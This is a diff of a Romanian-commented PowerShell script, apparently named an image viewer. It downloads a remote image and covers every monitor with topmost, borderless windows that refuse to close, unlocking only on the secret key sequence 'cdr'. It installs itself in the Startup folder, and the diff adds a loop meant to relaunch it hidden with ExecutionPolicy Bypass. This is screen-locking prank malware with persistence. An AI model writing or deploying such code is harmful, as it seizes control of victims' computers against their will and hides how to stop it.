@@ -2,7 +2,7 @@
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\image.jpg"
 
-# Funcție pentru descărcarea imaginii
+# Descărcare imagine
 function Download-Image {
     try {
         Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
@@ -12,55 +12,65 @@ function Download-Image {
     }
 }
 
-# Funcție pentru afișarea imaginii pe tot ecranul
+# Afișare imagine pe toate monitoarele
 function Show-FullScreenImage {
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Drawing
 
-    $form = New-Object System.Windows.Forms.Form
-    $form.WindowState = 'Maximized'
-    $form.FormBorderStyle = 'None'
-    $form.TopMost = $true
-    $form.BackColor = [System.Drawing.Color]::Black
-    $form.StartPosition = 'CenterScreen'
+    $screens = [System.Windows.Forms.Screen]::AllScreens
+    $forms = @()
 
-    try {
-        $img = [System.Drawing.Image]::FromFile($tempImagePath)
-    } catch {
-        Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
-        exit
+    foreach ($screen in $screens) {
+        $form = New-Object System.Windows.Forms.Form
+        $form.WindowState = 'Maximized'
+        $form.FormBorderStyle = 'None'
+        $form.TopMost = $true
+        $form.StartPosition = 'Manual'
+        $form.Location = $screen.Bounds.Location
+        $form.Size = $screen.Bounds.Size
+
+        try {
+            $img = [System.Drawing.Image]::FromFile($tempImagePath)
+        } catch {
+            Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
+            exit
+        }
+
+        $pictureBox = New-Object System.Windows.Forms.PictureBox
+        $pictureBox.Image = $img
+        $pictureBox.Dock = 'Fill'
+        $pictureBox.SizeMode = 'StretchImage'
+        $form.Controls.Add($pictureBox)
+
+        # Blochează închiderea
+        $form.FormClosing += {
+            param($sender, $eventArgs)
+            if (-not $global:exitFlag) {
+                $eventArgs.Cancel = $true
+            }
+        }
+
+        $forms += $form
     }
 
-    $pictureBox = New-Object System.Windows.Forms.PictureBox
-    $pictureBox.Image = $img
-    $pictureBox.Dock = 'Fill'
-    $pictureBox.SizeMode = 'StretchImage'
-    $form.Controls.Add($pictureBox)
-
-    # Variabilă globală pentru secvența de taste
+    # Eveniment pentru ascultarea tastelor
     $global:keySequence = ""
-
-    # Înregistrarea evenimentului KeyDown
-    $form.Add_KeyDown({
+    $forms[0].Add_KeyDown({
         param($sender, $eventArgs)
-        $global:keySequence += $eventArgs.KeyCode
-        if ($global:keySequence -like "*C*D*R") {
+        $global:keySequence += $eventArgs.KeyChar
+        if ($global:keySequence -like "*cdr") {
             Stop-All
         }
     })
 
-    # Protejează împotriva închiderii accidentale
-    $form.Add_FormClosing({
-        param($sender, $eventArgs)
-        if (-not $global:exitFlag) {
-            $eventArgs.Cancel = $true
-        }
-    })
+    foreach ($form in $forms) {
+        [void]$form.Show()
+    }
 
-    [void]$form.ShowDialog()
+    [System.Windows.Forms.Application]::Run()
 }
 
-# Funcție pentru oprirea completă a scriptului
+# Funcție pentru oprirea completă a aplicației
 function Stop-All {
     $global:exitFlag = $true
     Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat" -Force -ErrorAction SilentlyContinue
@@ -68,7 +78,7 @@ function Stop-All {
     exit
 }
 
-# Configurare pornire automată fără drepturi de administrator
+# Configurare pornire automată
 function Set-Startup {
     $scriptPath = $MyInvocation.MyCommand.Path
     $batFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat"
@@ -76,7 +86,19 @@ function Set-Startup {
     Set-Content -Path $batFilePath -Value $batContent -Force
 }
 
+# Monitorizare pentru persistență
+function Monitor-Process {
+    while ($true) {
+        if (-not (Get-Process -Id $pid -ErrorAction SilentlyContinue)) {
+            Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$MyInvocation.MyCommand.Path`"" -WindowStyle Hidden
+            exit
+        }
+        Start-Sleep -Seconds 1
+    }
+}
+
 # Executare funcționalități
 Download-Image
 Set-Startup
+Start-Job -ScriptBlock { Monitor-Process }
 Show-FullScreenImage
